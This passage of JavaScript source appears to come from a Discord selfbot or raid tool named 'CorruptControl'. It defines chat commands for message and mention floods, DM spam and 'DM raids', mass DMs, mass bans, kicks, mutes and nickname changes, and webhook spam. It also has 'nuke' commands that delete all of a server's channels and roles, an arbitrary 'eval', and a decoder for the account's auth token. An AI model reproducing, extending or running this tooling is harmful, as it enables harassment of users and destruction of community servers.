            if (!checkCooldown('godburst', true)) return '\u23F0 Cooldown';
            const count = Math.min(parseInt(a && a[0]) || 200, 500);
            const text = (a || []).slice(1).join(' ') || 'GOD';
            for (let i = 0; i < count; i++) { setTimeout(() => sendMessage(text), i * 35); }
            return '\uD83D\uDD25 GOD MODE: **' + count + 'x**';
        },

        async nukeburst(a) {
            if (!checkCooldown('nukeburst', true)) return '\u23F0 Cooldown';
            const count = Math.min(parseInt(a && a[0]) || 500, 1000);
            const text = (a || []).slice(1).join(' ') || 'NUCLEAR';
            for (let i = 0; i < count; i++) { setTimeout(() => sendMessage(text), i * 20); }
            return '\u2620\uFE0F **NUCLEAR: ' + count + 'x** — Hold on tight...';
        },

        say(a) { return (a || []).join(' ') || ''; },
        echo(a) { return (a || []).join(' ') || ''; },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: TEXT FLOOD
           ═══════════════════════════════════════════════════════════════ */

        wall(a) { const ch = (a && a[0]) || '#'; return ch.repeat(1999).slice(0, 1999); },
        lines(a) {
            const count = Math.min(parseInt(a && a[0]) || 10, 50);
            const text = (a || []).slice(1).join(' ') || 'line';
            return Array(count).fill(text).join('\n').slice(0, 2000);
        },
        flood(a) {
            const lines = Math.min(parseInt(a && a[0]) || 20, 40);
            const ch = (a && a[1]) || '\u2588';
            return Array(lines).fill(ch.repeat(40)).join('\n').slice(0, 2000);
        },
        emojispam(a) {
            const emoji = (a && a[0]) || '\uD83D\uDD25';
            const count = Math.min(parseInt(a && a[1]) || 50, 100);
            return emoji.repeat(count).slice(0, 2000);
        },
        mentionspam(a) {
            const count = Math.min(parseInt(a && a[0]) || 5, 25);
            const uid = (a && a[1]) ? a[1].replace(/[<@!>]/g, '') : getUserId();
            return ('<@' + uid + '> ').repeat(count).slice(0, 2000);
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: MODERATION
           ═══════════════════════════════════════════════════════════════ */

        async ban(a) {
            if (!a || !a[0]) return '\uD83D\uDD12 Usage: !ban @user [reason] [delete_days]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const reason = a.slice(1).join(' ') || 'CorruptControl';
            return await banMember(gid, uid, reason, 0) ? '\uD83D\uDD12 Banned <@' + uid + '>' : '\u274C Failed';
        },

        async unban(a) {
            if (!a || !a[0]) return 'Usage: !unban <user_id>';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await unbanMember(gid, a[0].replace(/[<@!>]/g, '')) ? '\u2705 Unbanned' : '\u274C Failed';
        },

        async kick(a) {
            if (!a || !a[0]) return 'Usage: !kick @user [reason]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await kickMember(gid, uid, a.slice(1).join(' ')) ? '\uD83E\uDD7A Kicked <@' + uid + '>' : '\u274C Failed';
        },

        async mute(a) {
            if (!a || !a[0]) return 'Usage: !mute @user <minutes>';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            const mins = parseInt(a[1]) || 60;
            if (!gid) return '\u274C Not in a server';
            return await timeoutMember(gid, uid, mins) ? '\uD83D\uDD07 Muted <@' + uid + '> for ' + mins + 'm' : '\u274C Failed';
        },

        async unmute(a) {
            if (!a || !a[0]) return 'Usage: !unmute @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await timeoutMember(gid, uid, 0) ? '\uD83D\uDD0A Unmuted <@' + uid + '>' : '\u274C Failed';
        },

        async purge(a) {
            const amount = Math.min(parseInt(a && a[0]) || 10, 100);
            const cid = getChannelId();
            const msgs = await getMessages(cid, amount + 15);
            const myId = getUserId();
            let deleted = 0;
            for (const m of msgs) {
                if (m.author.id === myId) {
                    if (await deleteMessage(cid, m.id)) deleted++;
                    if (deleted >= amount) break;
                    await $.sleep(120);
                }
            }
            return '\uD83D\uDDD1\uFE0F Purged **' + deleted + '** of my messages';
        },

        async purgeuser(a) {
            if (!a || !a[0]) return 'Usage: !purgeuser @user [amount]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const amount = Math.min(parseInt(a[1]) || 50, 100);
            const cid = getChannelId();
            const msgs = await getMessages(cid, 100);
            const userMsgs = msgs.filter(m => m.author.id === uid).slice(0, amount);
            let deleted = 0;
            for (const m of userMsgs) { if (await deleteMessage(cid, m.id)) deleted++; await $.sleep(100); }
            return '\uD83D\uDDD1\uFE0F Purged **' + deleted + '** messages from <@' + uid + '>';
        },

        async massban(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            if (!a || !a[0]) return 'Usage: !massban @user1 @user2 ...';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            let banned = 0;
            for (const user of a) {
                const uid = user.replace(/[<@!>]/g, '');
                if (await banMember(gid, uid)) banned++;
                await $.sleep(250);
            }
            return '\uD83D\uDD12 Mass banned **' + banned + '** users';
        },

        async masskick(a) {
            if (!a || !a[0]) return 'Usage: !masskick @user1 @user2 ...';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            let kicked = 0;
            for (const user of a) {
                const uid = user.replace(/[<@!>]/g, '');
                if (await kickMember(gid, uid)) kicked++;
                await $.sleep(250);
            }
            return '\uD83E\uDD7A Mass kicked **' + kicked + '** users';
        },

        async massmute(a) {
            if (!a || !a[0]) return 'Usage: !massmute @user1 @user2 ... <minutes>';
            const mins = parseInt(a[a.length - 1]) || 60;
            const targets = a.slice(0, a.length - 1);
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            let muted = 0;
            for (const user of targets) {
                const uid = user.replace(/[<@!>]/g, '');
                if (await timeoutMember(gid, uid, mins)) muted++;
                await $.sleep(200);
            }
            return '\uD83D\uDD07 Mass muted **' + muted + '** users for ' + mins + 'm';
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: CHANNEL MANAGEMENT
           ═══════════════════════════════════════════════════════════════ */

        async lock() {
            const gid = getGuildId();
            const cid = getChannelId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/channels/' + cid + '/permissions/' + gid, { method: 'PUT', body: JSON.stringify({ type: 0, deny: '2048' }) }); return r.ok ? '\uD83D\uDD12 Locked' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async unlock() {
            const gid = getGuildId();
            const cid = getChannelId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/channels/' + cid + '/permissions/' + gid, { method: 'DELETE' }); return r.ok ? '\uD83D\uDD13 Unlocked' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async slowmode(a) {
            const s = parseInt(a && a[0]) || 5;
            const cid = getChannelId();
            try { const r = await apiRequest('/channels/' + cid, { method: 'PATCH', body: JSON.stringify({ rate_limit_per_user: s }) }); return r.ok ? '\u23F1\uFE0F Slowmode: **' + s + 's**' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async clearslowmode() {
            const cid = getChannelId();
            try { const r = await apiRequest('/channels/' + cid, { method: 'PATCH', body: JSON.stringify({ rate_limit_per_user: 0 }) }); return r.ok ? '\u2705 Slowmode cleared' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async createchannel(a) {
            if (!a || !a[0]) return 'Usage: !createchannel <name> [text/voice]';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const name = a[0];
            const type = a[1] === 'voice' ? 2 : 0;
            const ch = await createChannel(gid, name, type);
            return ch ? '\u2705 Created **#' + ch.name + '**' : '\u274C Failed';
        },

        async deletechannel(a) {
            if (!a || !a[0]) return 'Usage: !deletechannel <#channel>';
            const cid = a[0].replace(/[<#>]/g, '');
            try { const r = await apiRequest('/channels/' + cid, { method: 'DELETE' }); return r.ok ? '\uD83D\uDDD1\uFE0F Deleted' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: ROLE MANAGEMENT
           ═══════════════════════════════════════════════════════════════ */

        async createrole(a) {
            if (!a || !a[0]) return 'Usage: !createrole <name> [#hex] [hoist]';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const name = a[0];
            const color = a[1] ? parseInt(a[1].replace('#', ''), 16) : 0;
            const hoist = a[2] === 'true' || a[2] === 'hoist';
            const r = await createRole(gid, name, color, hoist);
            return r ? '\u2705 Created @' + r.name + (color ? ' (color: ' + a[1] + ')' : '') : '\u274C Failed';
        },

        async deleterole(a) {
            if (!a || !a[0]) return 'Usage: !deleterole @role';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const rid = a[0].replace(/[<@&>]/g, '');
            return await deleteRole(gid, rid) ? '\uD83D\uDDD1\uFE0F Role deleted' : '\u274C Failed';
        },

        async rolecolor(a) {
            if (!a || a.length < 2) return 'Usage: !rolecolor @role #hex';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const rid = a[0].replace(/[<@&>]/g, '');
            const color = parseInt(a[1].replace('#', ''), 16);
            try { const r = await apiRequest('/guilds/' + gid + '/roles/' + rid, { method: 'PATCH', body: JSON.stringify({ color }) }); return r.ok ? '\uD83C\uDFA8 Role color updated' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async addrole(a) {
            if (!a || !a[0] || !a[1]) return 'Usage: !addrole @user @role';
            const uid = a[0].replace(/[<@!>]/g, '');
            const rid = a[1].replace(/[<@&>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await addRole(gid, uid, rid) ? '\u2705 Role added' : '\u274C Failed';
        },

        async removerole(a) {
            if (!a || !a[0] || !a[1]) return 'Usage: !removerole @user @role';
            const uid = a[0].replace(/[<@!>]/g, '');
            const rid = a[1].replace(/[<@&>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await removeRole(gid, uid, rid) ? '\u2705 Role removed' : '\u274C Failed';
        },

        async massrole(a) {
            if (!a || !a[0]) return 'Usage: !massrole @role';
            const rid = a[0].replace(/[<@&>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=1000');
                if (!r.ok) return '\u274C Failed';
                const members = await r.json();
                let added = 0;
                for (const m of members) {
                    try { if (await addRole(gid, m.user.id, rid)) added++; } catch { }
                    if (added % 10 === 0) await $.sleep(800);
                }
                return '\u2705 Added role to **' + added + '** members';
            } catch { return '\u274C Error'; }
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: USER MANAGEMENT
           ═══════════════════════════════════════════════════════════════ */

        async nick(a) {
            if (!a || !a[0]) return 'Usage: !nick @user [nickname]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const nick = a.slice(1).join(' ') || null;
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await changeNickname(gid, uid, nick) ? '\u2705 Nickname changed' : '\u274C Failed';
        },

        async deafen(a) {
            if (!a || !a[0]) return 'Usage: !deafen @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/' + uid, { method: 'PATCH', body: JSON.stringify({ deaf: true }) }); return r.ok ? '\uD83D\uDD07 Deafened <@' + uid + '>' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async undeafen(a) {
            if (!a || !a[0]) return 'Usage: !undeafen @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/' + uid, { method: 'PATCH', body: JSON.stringify({ deaf: false }) }); return r.ok ? '\uD83D\uDD0A Undeafened <@' + uid + '>' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async servermute(a) {
            if (!a || !a[0]) return 'Usage: !servermute @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/' + uid, { method: 'PATCH', body: JSON.stringify({ mute: true }) }); return r.ok ? '\uD83D\uDD07 Server muted <@' + uid + '>' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async serverunmute(a) {
            if (!a || !a[0]) return 'Usage: !serverunmute @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/' + uid, { method: 'PATCH', body: JSON.stringify({ mute: false }) }); return r.ok ? '\uD83D\uDD0A Server unmuted <@' + uid + '>' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async disconnect(a) {
            if (!a || !a[0]) return 'Usage: !disconnect @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/' + uid, { method: 'PATCH', body: JSON.stringify({ channel_id: null }) }); return r.ok ? '\uD83D\uDD0C Disconnected <@' + uid + '>' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async move(a) {
            if (!a || !a[0] || !a[1]) return 'Usage: !move @user #voice-channel';
            const uid = a[0].replace(/[<@!>]/g, '');
            const cid = a[1].replace(/[<#>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/' + uid, { method: 'PATCH', body: JSON.stringify({ channel_id: cid }) }); return r.ok ? '\uD83D\uDD0C Moved <@' + uid + '> to <#' + cid + '>' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: VOICE COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async voicekick(a) {
            if (!a || !a[0]) return 'Usage: !voicekick @user';
            return COHOST_COMMANDS.disconnect(a);
        },

        async voicemoveall(a) {
            if (!a || !a[0]) return 'Usage: !voicemoveall #channel';
            const cid = a[0].replace(/[<#>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=1000');
                if (!r.ok) return '\u274C Failed';
                const members = await r.json();
                let moved = 0;
                for (const m of members) {
                    if (m.voice_state?.channel_id) {
                        try { await apiRequest('/guilds/' + gid + '/members/' + m.user.id, { method: 'PATCH', body: JSON.stringify({ channel_id: cid }) }); moved++; } catch { }
                        await $.sleep(150);
                    }
                }
                return '\uD83D\uDD0C Moved **' + moved + '** users to <#' + cid + '>';
            } catch { return '\u274C Error'; }
        },

        async voicemuteall() {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=200');
                if (!r.ok) return '\u274C Failed';
                const members = await r.json();
                let muted = 0;
                for (const m of members) {
                    if (m.voice_state?.channel_id) {
                        try { await apiRequest('/guilds/' + gid + '/members/' + m.user.id, { method: 'PATCH', body: JSON.stringify({ mute: true }) }); muted++; } catch { }
                    }
                }
                return '\uD83D\uDD07 Server muted **' + muted + '** users in voice';
            } catch { return '\u274C Error'; }
        },

        async voicedeafall() {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=200');
                if (!r.ok) return '\u274C Failed';
                const members = await r.json();
                let deafened = 0;
                for (const m of members) {
                    if (m.voice_state?.channel_id) {
                        try { await apiRequest('/guilds/' + gid + '/members/' + m.user.id, { method: 'PATCH', body: JSON.stringify({ deaf: true }) }); deafened++; } catch { }
                    }
                }
                return '\uD83D\uDD07 Deafened **' + deafened + '** users in voice';
            } catch { return '\u274C Error'; }
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: DM COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async dm(a) {
            if (!a || !a[0]) return 'Usage: !dm @user <message>';
            const uid = a[0].replace(/[<@!>]/g, '');
            const msg = a.slice(1).join(' ') || 'Hello!';
            return await sendDM(uid, msg) ? '\uD83D\uDC8C DM sent to <@' + uid + '>' : '\u274C Failed';
        },

        async dmspam(a) {
            if (!a || !a[0]) return 'Usage: !dmspam @user <count> [text]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const count = Math.min(parseInt(a[1]) || 5, 25);
            const text = a.slice(2).join(' ') || 'spam';
            for (let i = 0; i < count; i++) { setTimeout(() => sendDM(uid, text + ' ' + (i + 1)), i * 1100); }
            return '\uD83D\uDC8C DM spam: **' + count + 'x** to <@' + uid + '>';
        },

        async massdm(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            const text = (a || []).join(' ') || 'Hello!';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=50');
                if (!r.ok) return '\u274C Failed';
                const members = await r.json();
                let sent = 0;
                for (const m of members) { if (await sendDM(m.user.id, text)) sent++; await $.sleep(900); }
                return '\uD83D\uDC8C Mass DM sent to **' + sent + '** members';
            } catch { return '\u274C Error'; }
        },

        async dmraid(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            if (!a || !a[0]) return 'Usage: !dmraid @user <count> [message]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const count = Math.min(parseInt(a[1]) || 20, 100);
            const text = a.slice(2).join(' ') || 'raid';
            for (let i = 0; i < count; i++) { setTimeout(() => sendDM(uid, text), i * 300); }
            return '\uD83D\uDEA8 DM raid: **' + count + 'x** messages to <@' + uid + '>';
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: REACTION COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async reactspam(a) {
            const emoji = (a && a[0]) || '\uD83D\uDD25';
            const count = Math.min(parseInt(a && a[1]) || 10, 60);
            const cid = getChannelId();
            const msgs = await getMessages(cid, count);
            for (let i = 0; i < msgs.length; i++) { setTimeout(() => addReaction(cid, msgs[i].id, emoji), i * 120); }
            return '\uD83D\uDC4D Reacted ' + emoji + ' to **' + msgs.length + '** messages';
        },

        async clearreacts(a) {
            const cid = getChannelId();
            const mid = a && a[0];
            if (!mid) return 'Usage: !clearreacts <message_id>';
            return await removeAllReactions(cid, mid) ? '\uD83D\uDDD1\uFE0F Reactions cleared' : '\u274C Failed';
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: WEBHOOK COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async webhook(a) {
            if (!a || !a.length) return 'Usage: !webhook <message>';
            const cid = getChannelId();
            const hook = await createWebhook(cid, 'CC-Webhook');
            if (!hook) return '\u274C Failed to create webhook';
            await sendWebhook('https://discord.com/api/webhooks/' + hook.id + '/' + hook.token, a.join(' '));
            return '\uD83D\uDD17 Webhook sent';
        },

        async createhook(a) {
            const cid = getChannelId();
            const hook = await createWebhook(cid, (a && a.join(' ')) || 'Webhook');
            return hook ? '\u2705 Created webhook: **' + hook.name + '**' : '\u274C Failed';
        },

        async sendhook(a) {
            if (!a || a.length < 2) return 'Usage: !sendhook <url> <message>';
            return await sendWebhook(a[0], a.slice(1).join(' ')) ? '\uD83D\uDD17 Webhook sent' : '\u274C Failed';
        },

        async webhookspam(a) {
            if (!a || a.length < 3) return 'Usage: !webhookspam <count> <url> <message>';
            const count = Math.min(parseInt(a[0]) || 10, 50);
            const url = a[1];
            const text = a.slice(2).join(' ');
            for (let i = 0; i < count; i++) { setTimeout(() => sendWebhook(url, text + ' [' + (i + 1) + ']'), i * 180); }
            return '\uD83D\uDD17 Webhook spam: **' + count + 'x**';
        },

        async webhooknuke(a) {
            if (!a || !a[0]) return 'Usage: !webhooknuke <#channel>';
            const hooks = await getChannelWebhooks(a[0].replace(/[<#>]/g, ''));
            let deleted = 0;
            for (const h of hooks) { try { await deleteWebhook(h.id, h.token); deleted++; } catch { } await $.sleep(150); }
            return '\uD83D\uDEA8 Deleted **' + deleted + '** webhooks';
        },

        async webhookdelete(a) {
            if (!a || a.length < 2) return 'Usage: !webhookdelete <id> <token>';
            return await deleteWebhook(a[0], a[1]) ? '\uD83D\uDDD1\uFE0F Deleted' : '\u274C Failed';
        },

        async webhookinfo(a) {
            if (!a || !a[0]) return 'Usage: !webhookinfo <#channel>';
            const hooks = await getChannelWebhooks(a[0].replace(/[<#>]/g, ''));
            if (!hooks.length) return '\u274C No webhooks found';
            return '\uD83D\uDD17 **Webhooks (' + hooks.length + '):**\n' + hooks.slice(0, 10).map(h => '- **' + h.name + '** (' + h.channel_id + ')').join('\n');
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: PIN & MESSAGE COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async pin(a) {
            if (!a || !a[0]) return 'Usage: !pin <message_id>';
            const cid = getChannelId();
            try { const r = await apiRequest('/channels/' + cid + '/pins/' + a[0], { method: 'PUT' }); return r.ok ? '\uD83D\uDCCC Pinned' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async unpin(a) {
            if (!a || !a[0]) return 'Usage: !unpin <message_id>';
            const cid = getChannelId();
            try { const r = await apiRequest('/channels/' + cid + '/pins/' + a[0], { method: 'DELETE' }); return r.ok ? '\uD83D\uDCCC Unpinned' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        async editmsg(a) {
            if (!a || a.length < 2) return 'Usage: !editmsg <message_id> <new_content>';
            const cid = getChannelId();
            return await editMessage(cid, a[0], a.slice(1).join(' ')) ? '\u2705 Message edited' : '\u274C Failed';
        },

        async crosspost(a) {
            if (!a || !a[0]) return 'Usage: !crosspost <message_id>';
            const cid = getChannelId();
            return await crosspostMessage(cid, a[0]) ? '\uD83D\uDCE4 Crossposted' : '\u274C Failed';
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: NUKE COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async nukechannels() {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const channels = await getGuildChannels(gid);
            let deleted = 0;
            for (const c of channels) {
                try { const r = await apiRequest('/channels/' + c.id, { method: 'DELETE' }); if (r.ok) deleted++; } catch { }
                await $.sleep(250);
            }
            return '\uD83D\uDEA8 Nuked **' + deleted + '** channels';
        },

        async nukeroles() {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const roles = await getGuildRoles(gid);
            let deleted = 0;
            for (const r of roles) {
                if (r.managed || r.name === '@everyone') continue;
                try { if (await deleteRole(gid, r.id)) deleted++; } catch { }
                await $.sleep(250);
            }
            return '\uD83D\uDEA8 Nuked **' + deleted + '** roles';
        },

        async massnick(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            const nick = (a || []).join(' ') || 'CorruptControl';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=1000');
                if (!r.ok) return '\u274C Failed';
                const members = await r.json();
                let changed = 0;
                for (const m of members) {
                    try { if (await changeNickname(gid, m.user.id, nick)) changed++; } catch { }
                    if (changed % 5 === 0) await $.sleep(500);
                }
                return '\uD83D\uDEA8 Changed **' + changed + '** nicknames to "' + nick + '"';
            } catch { return '\u274C Error'; }
        },

        async massdelete(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            const amount = Math.min(parseInt(a && a[0]) || 100, 1000);
            const cid = getChannelId();
            let deleted = 0;
            for (let i = 0; i < Math.ceil(amount / 100); i++) {
                const msgs = await getMessages(cid, 100);
                if (!msgs.length) break;
                const myId = getUserId();
                for (const m of msgs) {
                    if (m.author.id === myId) { if (await deleteMessage(cid, m.id)) deleted++; }
                    if (deleted >= amount) break;
                }
                if (deleted >= amount) break;
                await $.sleep(1000);
            }
            return '\uD83D\uDDD1\uFE0F Deleted **' + deleted + '** messages';
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: COHOST MANAGEMENT
           ═══════════════════════════════════════════════════════════════ */

        addcohost(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            if (!a || !a[0]) return 'Usage: !addcohost @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            return addCohost(uid) ? '\uD83D\uDC65 Added <@' + uid + '> as cohost' : 'Already a cohost';
        },

        removecohost(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            if (!a || !a[0]) return 'Usage: !removecohost @user';
            const uid = a[0].replace(/[<@!>]/g, '');
            return removeCohost(uid) ? '\uD83D\uDC65 Removed <@' + uid + '>' : 'Not a cohost';
        },

        clearcohosts() {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            COHOSTS.length = 0; saveCohosts();
            return '\uD83D\uDDD1\uFE0F All cohosts cleared';
        },

        listcohosts() {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            return '\uD83D\uDC65 **Cohosts (' + COHOSTS.length + '):**\n' + (COHOSTS.length > 0 ? COHOSTS.map(id => '- <@' + id + '>').join('\n') : 'None');
        },

        setowner(a) {
            if (!state.isOwner && OWNER_ID) return '\uD83D\uDD12 Owner only';
            if (!a || !a[0]) return 'Usage: !setowner @user';
            OWNER_ID = a[0].replace(/[<@!>]/g, '');
            Settings.save('ownerId', OWNER_ID); state.isOwner = checkIsOwner();
            return '\uD83D\uDC51 Owner set to <@' + OWNER_ID + '>';
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: ADMIN COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async typing() {
            const cid = getChannelId();
            await triggerTyping(cid);
            return '\uD83D\uDCAC Typing triggered';
        },

        eval(a) {
            if (!state.isOwner) return '\uD83D\uDD12 Owner only';
            try { const result = eval((a || []).join(' ')); return '```\n' + String(result).slice(0, 1800) + '\n```'; } catch (e) { return '\u274C Error: ' + e.message; }
        },

        autoreact(a) {
            if (!a || !a[0]) { state.autoReact.enabled = !state.autoReact.enabled; return '\uD83D\uDC4D Auto-react: **' + (state.autoReact.enabled ? 'ON' : 'OFF') + '** (' + state.autoReact.emoji + ')'; }
            state.autoReact.emoji = a[0]; state.autoReact.enabled = true;
            return '\uD83D\uDC4D Auto-react set to ' + state.autoReact.emoji;
        },

        autodel() { state.autoDel = !state.autoDel; return '\uD83D\uDDD1\uFE0F Auto-delete: **' + (state.autoDel ? 'ON' : 'OFF') + '**'; },
        hidden() { state.hiddenMode = !state.hiddenMode; WatermarkCfg.hidden = state.hiddenMode; buildWatermark(); return '\uD83D\uDC41\uFE0F Hidden mode: **' + (state.hiddenMode ? 'ON' : 'OFF') + '**'; },

        async autoping(a) {
            if (!a || !a[0]) return 'Usage: !autoping <on/off>';
            state.autoPingEnabled = a[0] === 'on';
            return '\uD83D\uDCEC Auto-ping: **' + (state.autoPingEnabled ? 'ON' : 'OFF') + '**';
        },

        async autonick(a) {
            if (!a || !a[0]) return 'Usage: !autonick <nickname>';
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try { const r = await apiRequest('/guilds/' + gid + '/members/@me', { method: 'PATCH', body: JSON.stringify({ nick: a.join(' ') }) }); return r.ok ? '\u2705 Auto-nick set' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        autoreply(a) {
            if (!a || a.length < 2) return 'Usage: !autoreply <trigger> <response>';
            const trigger = a[0]; const response = a.slice(1).join(' ');
            state.autoReplies[trigger.toLowerCase()] = response;
            Settings.save('autoReplies', state.autoReplies);
            return '\uD83D\uDD04 Auto-reply: "' + trigger + '" \u2192 "' + response + '"';
        },

        clearreplies() {
            state.autoReplies = {};
            Settings.save('autoReplies', {});
            return '\uD83D\uDDD1\uFE0F All auto-replies cleared';
        },

        tokeninfo(a) {
            const token = (a && a[0]) || getToken();
            if (!token) return '\u274C No token';
            try {
                const parts = token.split('.');
                const header = JSON.parse(atob(parts[0]));
                const payload = JSON.parse(atob(parts[1]));
                return `\uD83D\uDD11 **Token Info**
User ID: \`${header.id || payload.id || 'Unknown'}\`
Issued: ${payload.iat ? new Date(payload.iat * 1000).toLocaleString() : 'Unknown'}`;
            } catch { return '\u274C Invalid token'; }
        },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: UTILITY & INFO
           ═══════════════════════════════════════════════════════════════ */

        async cloneserver() {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            try {
                const [channels, roles] = await Promise.all([getGuildChannels(gid), getGuildRoles(gid)]);
                const g = await getGuildInfo(gid);
                let report = `\uD83D\uDCDC **Server Clone Report: ${g?.name || 'Unknown'}**

**Roles (${roles.length}):**
${roles.slice(0, 25).map(r => '- ' + r.name + ' (0x' + (r.color || 0).toString(16).padStart(6, '0') + ')').join('\n')}`;
                report += `\n\n**Channels (${channels.length}):**
${channels.slice(0, 25).map(c => '- ' + (c.type === 0 ? '#' : c.type === 2 ? '\uD83D\uDD0A' : c.type === 4 ? '\uD83D\uDCC2' : '') + ' ' + c.name).join('\n')}`;
                return report.slice(0, 1950);
            } catch { return '\u274C Failed'; }
        },

        async auditlog(a) {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const log = await getAuditLog(gid, Math.min(parseInt(a && a[0]) || 10, 50));
            if (!log) return '\u274C Failed';
            return `\uD83D\uDCDC **Audit Log**
${log.audit_log_entries.slice(0, 20).map(e => '- Action ' + e.action_type + ' by <@' + e.user_id + '>').join('\n')}`;
        },

        ghostping() {
            if (!state.ghostPings.length) return '\uD83D\uDC7B No ghost pings detected';
            return `\uD83D\uDC7B **Recent Ghost Pings:**
${state.ghostPings.slice(-10).map((gp, i) => (i + 1) + '. <@' + gp.author + '> — ' + $.timeAgo(gp.time)).join('\n')}`;
        },

